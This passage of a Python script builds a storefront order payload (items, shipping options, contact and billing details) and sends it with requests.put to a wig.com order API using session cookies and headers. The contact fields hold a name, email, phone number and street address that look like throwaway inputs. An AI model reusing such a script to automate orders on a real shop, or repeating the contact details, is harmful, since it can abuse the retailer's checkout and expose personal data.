            'weightedOrderShippingManualAdjustment': 0,
            'weightedOrderShippingTax': 0,
            'weightedOrderHandlingFee': 0,
            'weightedOrderHandlingFeeTax': 0,
            'weightedOrderHandlingFeeDiscount': 0,
            'weightedOrderDuty': 0,
            'totalWithWeightedShippingAndHandling': 1.95,
            'weightedOrderHandlingAdjustment': 0,
            'isAssemblyRequired': False,
        },
    ],
    'validationResults': [],
    'payments': [],
    'refunds': [],
    'credits': [],
    'packages': [],
    'pickups': [],
    'digitalPackages': [],
    'isDraft': False,
    'hasDraft': False,
    'isImport': False,
    'isHistoricalImport': False,
    'isUnified': True,
    'couponCodes': [],
    'invalidCoupons': [],
    'amountAvailableForRefund': 0,
    'amountRemainingForPayment': 8.94,
    'amountRefunded': 0,
    'readyToCapture': False,
    'isOptInForSms': False,
    'continuityOrderOrdinal': 0,
    'isContinuityOrder': False,
    'userId': 'a2db4ff4f580490a8585f194f4d26e95',
    'id': '17dbfdfe35ee4a0001f3654e00006b47',
    'tenantId': 27463,
    'siteId': 52707,
    'currencyCode': 'USD',
    'customerInteractionType': 'Unknown',
    'fulfillmentInfo': {
        'auditInfo': {
            'updateDate': '2024-09-07T00:36:14.196Z',
            'createDate': '2024-09-07T00:36:14.196Z',
            'updateBy': 'a2db4ff4f580490a8585f194f4d26e95',
            'createBy': 'a2db4ff4f580490a8585f194f4d26e95',
        },
        'fulfillmentContact': {
            'billingContact': {
                'email': 'gsgflkjas@gmail.com',
            },
            'address': {
                'candidateValidatedAddresses': [
                    {
                        'address1': '412 AV PARK FL 4',
                        'address2': '',
                        'cityOrTown': 'NEW YORK',
                        'stateOrProvince': 'NY',
                        'postalOrZipCode': '10080-0001',
                        'countryCode': 'US',
                        'addressType': 'Residential',
                        'isValidated': True,
                    },
                ],
                'countryCode': 'US',
                'addressType': 'Residential',
                'address1': '412 AV PARK FL 4',
                'address2': '',
                'cityOrTown': 'NEW YORK',
                'stateOrProvince': 'NY',
                'postalOrZipCode': '10080-0001',
                'isValidated': True,
            },
            'isActiveStep': True,
            'orderId': '17dbfdfe35ee4a0001f3654e00006b47',
            'firstName': 'Awas',
            'lastNameOrSurname': 'CON LA RAZA',
            'phoneNumbers': {
                'home': '748 955 4598',
            },
        },
        'shippingDescs': [
            {
                'id': 'BE59',
                'title': 'US Standard Ground',
                'desc': 'Allow 5-7 business days for delivery. Applies only on completed orders.',
                'order': 1,
            },
            {
                'id': 'BE05',
                'title': 'US 2-3 Day Delivery',
                'desc': 'Allow 2-3 business days for delivery of in-stock items.',
                'order': 2,
            },
            {
                'id': 'BE12',
                'title': 'US Overnight (Mon - Fri)',
                'desc': 'No deliveries to P.O. Boxes. Overnight shipping not available on drop ship items.',
                'order': 3,
            },
            {
                'id': 'WG59',
                'title': 'US Standard Ground',
                'desc': 'Allow 5-7 business days for delivery. Applies only on completed orders.',
                'order': 1,
            },
            {
                'id': 'WG05',
                'title': 'US 2-3 Day Delivery',
                'desc': 'Allow 2-3 business days for delivery of in-stock items.',
                'order': 2,
            },
            {
                'id': 'WG12',
                'title': 'US Overnight (Mon-Fri)',
                'desc': 'No deliveries to P.O. Boxes. Overnight shipping not available on drop ship items.',
                'order': 3,
            },
            {
                'id': 'WG45',
                'title': 'Canadian Shipping (2-3 Weeks)',
                'desc': 'Please allow 2-3 weeks for delivery.',
                'order': 3,
            },
            {
                'id': 'WG18',
                'title': 'International Shipping (3-4 Weeks)',
                'desc': 'Orders shipped outside the continental U.S. may be subject to tariffs, duties and/or taxes upon delivery and are the sole responsibility of the customer. $74.95 for 1 item, $15 for each additional item, All shipments outside of the continental United States and Canada are sent via UPS 3-4 Weeks',
                'order': 3,
            },
            {
                'id': 'WG76',
                'title': 'US Standard Ground',
                'desc': 'Allow 5-7 business days for delivery. Applies only on completed orders.',
                'order': 1,
            },
            {
                'id': 'WG60',
                'title': 'US 2-3 Day Delivery',
                'desc': 'Allow 2-3 business days for delivery of in-stock items.',
                'order': 2,
            },
        ],
        'shippingDiscounts': [],
        'isActiveStep': False,
        'orderId': '17dbfdfe35ee4a0001f3654e00006b47',
    },
    'orderDiscounts': [],
    'suggestedDiscounts': [],
    'subtotal': 8.94,
    'discountedSubtotal': 8.94,
    'discountTotal': 0,
    'discountedTotal': 8.94,
    'shippingTotal': 0,
    'shippingSubTotal': 0,
    'shippingTaxTotal': 0,
    'handlingTaxTotal': 0,
    'itemTaxTotal': 0,
    'taxTotal': 0,
    'feeTotal': 0,
    'total': 8.94,
    'lineItemSubtotalWithOrderAdjustments': 8.94,
    'shippingAmountBeforeDiscountsAndAdjustments': 0,
    'expirationDate': '2024-09-21T00:36:14.186Z',
    'changeMessages': [
        {
            'id': 'be9cbb85a6554a3285b3b1e40009f402',
            'correlationId': 'f80d3513d24549c1a66f9f3b9c666f3c',
            'userId': 'a2db4ff4f580490a8585f194f4d26e95',
            'userScopeType': 'Shopper',
            'appId': 'c9141bc2fcc14cebb0f727d0374ae956',
            'appKey': 'mozu.MozuStorefront.2426.10.0.Release',
            'subjectType': 'StateChange.WorkflowAction',
            'success': True,
            'identifier': '17dbfdfe35ee4a0001f3654e00006b47',
            'subject': 'CreateOrder',
            'verb': 'Applied',
            'message': 'Workflow action succeeded.',
            'metadata': [
                {
                    'oldValue': 'Null',
                    'newValue': 'Pending',
                },
            ],
            'oldValue': 'Null',
            'newValue': 'Pending',
            'createDate': '2024-09-07T00:36:14.3Z',
        },
    ],
    'extendedProperties': [],
    'discountThresholdMessages': [],
    'auditInfo': {
        'updateDate': '2024-09-07T00:36:14.301Z',
        'createDate': '2024-09-07T00:36:14.301Z',
        'updateBy': 'a2db4ff4f580490a8585f194f4d26e95',
        'createBy': 'a2db4ff4f580490a8585f194f4d26e95',
    },
    'requiresFulfillmentInfo': True,
    'requiresDigitalFulfillmentContact': False,
    'requiresShippingMethod': True,
    'isAmazonPayEnable': False,
    'billingInfo': {
        'billingContact': {
            'userId': 'a2db4ff4f580490a8585f194f4d26e95',
            'billingContact': {},
            'address': {
                'candidateValidatedAddresses': None,
                'countryCode': 'US',
                'addressType': 'Residential',
                'stateOrProvince': 'n/a',
                'postalOrZipCode': 'n/a',
            },
            'email': 'gsgflkjas@gmail.com',
        },
        'paymentWorkflow': 'Mozu',
        'check': {},
        'card': {
            'isCvvOptional': False,
            'isDefaultPayMethod': False,
            'isSavedCard': False,
            'isVisaCheckout': False,
        },
        'purchaseOrder': {
            'isEnabled': False,
            'splitPayment': False,
            'amount': 0,
            'availableBalance': 0,
            'creditLimit': 0,
        },
        'isSameBillingShippingAddress': True,
        'isActiveStep': False,
        'payAmount': 8.94,
        'noApplePay': True,
        'orderId': '17dbfdfe35ee4a0001f3654e00006b47',
        'paymentType': 'CreditCard',
        'email': 'gsgflkjas@gmail.com',
    },
    'shopperNotes': {},
    'customer': {
        'contacts': [],
        'cards': [],
        'credits': [],
    },
    'isReady': False,
    'email': 'gsgflkjas@gmail.com',
}

response = requests.put(
    'https://www.wig.com/api/commerce/orders/17dbfdfe35ee4a0001f3654e00006b47',
    cookies=cookies,
    headers=headers,
    json=json_data,
)


"""